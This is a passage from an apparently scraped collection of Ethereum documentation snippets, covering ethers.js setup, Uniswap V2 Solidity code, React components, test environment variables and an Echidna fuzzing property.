ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV DUP1 ISZERO PUSH2 0x57C JUMPI DUP1 PUSH1 0x1F LT PUSH2 0x551 JUMPI PUSH2 0x100 DUP1 DUP4 SLOAD DIV MUL DUP4 MSTORE SWAP2 PUSH1 0x20 ADD SWAP2 PUSH2 0x57C JUMP JUMPDEST DUP3 ADD SWAP2 SWAP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 SWAP1 JUMPDEST DUP2 SLOAD DUP2 MSTORE SWAP1 PUSH1 0x1 A\n```\n\n----------------------------------------\n\nTITLE: Remaining Parameters for ERC20DepositInitiated Event\nDESCRIPTION: Defines the sender, recipient, amount, and additional data parameters for the ERC20DepositInitiated event. The data field allows attaching notes or additional information to token transfers across layers.\n\nLANGUAGE: solidity\nCODE:\n```\n        address indexed _from,\n        address _to,\n        uint256 _amount,\n        bytes _data\n    );\n```\n\n----------------------------------------\n\nTITLE: Setting Up Environment Variables for Testing\nDESCRIPTION: Configures environment variables for testing permissions, including the world contract address and both authorized and unauthorized private keys.\n\nLANGUAGE: shell\nCODE:\n```\nWORLD_ADDRESS=0x8d8b6b8414e1e3dcfd4168561b9be6bd3bf6ec4b\nUNAUTHORIZED_KEY=0x5de4111afa1a4b94908f83103eb1f1706367c2e68ca870fc3fb9a804cdab365a\nAUTHORIZED_KEY=0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d\n```\n\n----------------------------------------\n\nTITLE: Loading ethers.js using UMD in Browser\nDESCRIPTION: HTML script tag that loads ethers.js using the UMD format from a CDN for legacy browser compatibility.\n\nLANGUAGE: html\nCODE:\n```\n<script\n  src=\"https://cdn.ethers.io/lib/ethers-5.0.umd.min.js\"\n  type=\"application/javascript\"\n></script>\n```\n\n----------------------------------------\n\nTITLE: Creating an Ethereum Smart Contract Interaction Script\nDESCRIPTION: A JavaScript script that sets up environment variables to interact with a deployed Ethereum smart contract. The script imports environment variables for API key, private key, and contract address to establish secure connections.\n\nLANGUAGE: javascript\nCODE:\n```\n// interact.js\n\nconst API_KEY = process.env.API_KEY\nconst PRIVATE_KEY = process.env.PRIVATE_KEY\nconst CONTRACT_ADDRESS = process.env.CONTRACT_ADDRESS\n```\n\n----------------------------------------\n\nTITLE: Basic Storybook Story Structure in TypeScript\nDESCRIPTION: Shows the initial structure for a component story file using Component Story Format v3 with TypeScript. Includes meta configuration and a basic story export.\n\nLANGUAGE: tsx\nCODE:\n```\nimport ComponentA from \".\"\n\nconst meta {\n  title: \"ComponentA\",\n  component: ComponentA\n} satisfies Meta<typeof ComponentA>\n\nexport default meta\n// Please use `typeof meta` for maximum type safety\ntype Story = StoryObj<typeof meta>;\n\nexport const Basic: Story = {}\n```\n\n----------------------------------------\n\nTITLE: Using Emoji Component in React\nDESCRIPTION: Demonstrates how to implement the custom Emoji component which uses Twemoji for consistent emoji rendering across platforms with custom font size.\n\nLANGUAGE: tsx\nCODE:\n```\n// Example of emoji use\nimport Emoji from \"./Emoji\"\n\n// Within JSX:\n;<Emoji text=\":star:\" fontSize=\"xl\" /> // the base fontSize is `md`\n```\n\n----------------------------------------\n\nTITLE: Adding Summary Element to Details Component in React\nDESCRIPTION: The summary element that serves as the clickable header for the collapsible details component, displaying the object name as the visible label.\n\nLANGUAGE: tsx\nCODE:\n```\n      <summary>{attrs.name}</summary>\n      <pre>\n        {JSON.stringify(attrs.object, null, 2)}\n```\n\n----------------------------------------\n\nTITLE: Contract Method Summary Table\nDESCRIPTION: A summary table listing all identified contract methods and their functionality, including transfer behavior, getter functions, and the lookup function.\n\nLANGUAGE: markdown\nCODE:\n```\n| Metod                             | Anlam                                                                                        |\n| --------------------------------- | -------------------------------------------------------------------------------------------- |\n| Aktarım                           | Çağrı tarafından sağlanan değeri kabul edin ve `Value*` değerini bu miktarda artırın         |\n| [splitter()](#splitter)           | Return Storage[3], the proxy address                                                         |\n| [currentWindow()](#currentwindow) | Return Storage[1]                                                                            |\n| [merkleRoot()](#merkeroot)        | Return Storage[0]                                                                            |\n| [0x81e580d3](#0x81e580d3)         | Parametrenin Storage[4] değerinden küçük olması koşuluyla, arama tablosundan değeri döndürün |\n| [0x1f135823](#0x1f135823)         | Return Storage[6], a.k.a. Value*                                                            |\n```\n\n----------------------------------------\n\nTITLE: Updated useEffect with Smart Contract Listener\nDESCRIPTION: This enhanced useEffect hook loads the current message from the smart contract and also sets up the event listener to automatically update the UI when the contract's message changes.\n\nLANGUAGE: javascript\nCODE:\n```\n// HelloWorld.js\n\nuseEffect(async () => {\n  const message = await loadCurrentMessage()\n  setMessage(message)\n  addSmartContractListener()\n}, [])\n```\n\n----------------------------------------\n\nTITLE: Writing a Property for Echidna Testing\nDESCRIPTION: An example of how to write a property function for Echidna testing. The function checks that user balances never exceed 1000 tokens, which should help identify the backdoor function as an exploit.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction echidna_balance_under_1000() public view returns(bool){\n      return balances[msg.sender] <= 1000;\n}\n```\n\n----------------------------------------\n\nTITLE: Fixed-Point Number Library for Uniswap V2 (UQ112x112)\nDESCRIPTION: A library for handling binary fixed-point numbers in the format UQ112x112. This enables precise fractional calculations within Ethereum's integer-only environment, using 2^112 as the scaling factor.\n\nLANGUAGE: solidity\nCODE:\n```\npragma solidity =0.5.16;\n\n// a library for handling binary fixed point numbers (https://wikipedia.org/wiki/Q_(number_format))\n\n// range: [0, 2**112 - 1]\n// resolution: 1 / 2**112\n\nlibrary UQ112x112 {\n    uint224 constant Q112 = 2**112;\n\n    // encode a uint112 as a UQ112x112\n    function encode(uint112 y) internal pure returns (uint224 z) {\n        z = uint224(y) * Q112; // never overflows\n    }\n\n    // divide a UQ112x112 by a uint112, returning a UQ112x112\n    function uqdiv(uint224 x, uint112 y) internal pure returns (uint224 z) {\n        z = x / uint224(y);\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Creating an Ethereum Contract Instance with Ethers.js\nDESCRIPTION: Code that initializes the provider, signer, and contract instance using Ethers.js to enable interaction with the deployed smart contract on the Goerli testnet.\n\nLANGUAGE: javascript\nCODE:\n```\n// interact.js\n\n// Provider\nconst alchemyProvider = new ethers.providers.AlchemyProvider(\n  (network = \"goerli\"),\n  API_KEY\n)\n\n// Signer\nconst signer = new ethers.Wallet(PRIVATE_KEY, alchemyProvider)\n\n// Contract\nconst helloWorldContract = new ethers.Contract(\n  CONTRACT_ADDRESS,\n  contract.abi,\n  signer\n)\n```\n\n----------------------------------------\n\nTITLE: Installing and Running create-eth-app with Yarn\nDESCRIPTION: Commands to install create-eth-app using Yarn, create a new Ethereum application, and start the development server. Requires Yarn 0.25 or higher.\n\nLANGUAGE: bash\nCODE:\n```\nyarn create eth-app my-eth-app\ncd my-eth-app\nyarn react-app:start\n```\n\n----------------------------------------\n\nTITLE: swapTokensForExactTokens Implementation\nDESCRIPTION: Allows users to specify the exact amount of output tokens they want to receive and the maximum input they're willing to pay. Unlike swapExactTokensForTokens, this function focuses on guaranteeing the output amount.\n\nLANGUAGE: solidity\nCODE:\n```\n    function swapTokensForExactTokens(\n        uint amountOut,\n        uint amountInMax,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external virtual override ensure(deadline) returns (uint[] memory amounts) {\n        amounts = UniswapV2Library.getAmountsIn(factory, amountOut, path);\n        require(amounts[0] <= amountInMax, 'UniswapV2Router: EXCESSIVE_INPUT_AMOUNT');\n        TransferHelper.safeTransferFrom(\n            path[0], msg.sender, UniswapV2Library.pairFor(factory, path[0], path[1]), amounts[0]\n        );\n        _swap(amounts, path, to);\n    }\n```"
  }
]